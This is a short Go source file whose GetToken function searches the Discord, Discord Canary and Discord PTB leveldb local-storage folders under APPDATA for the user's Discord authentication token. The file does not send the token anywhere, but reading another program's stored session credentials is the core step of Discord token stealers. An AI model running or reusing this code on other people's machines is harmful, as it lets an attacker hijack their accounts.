package token

import (
	"os"
	"path/filepath"

	log "github.com/sirupsen/logrus"
)

var versions = []string{"Discord", "discordcanary", "discordptb"}

func GetToken() (string, error) {
	appdata, def := os.LookupEnv("APPDATA")
	if !def {
		return "", ErrorNoAppdataPath
	}

	for _, ver := range versions {
		path := filepath.Join(appdata, ver, "Local Storage/leveldb")
		log.Debugf("searching for leveldb database in %v", path)

		tok, err := searchLevelDB(path)
		if err != nil {
			// Try another database
			log.Debug(err)
			continue
		}

		return tok, nil
	}

	return "", ErrorTokenRetrieve
}
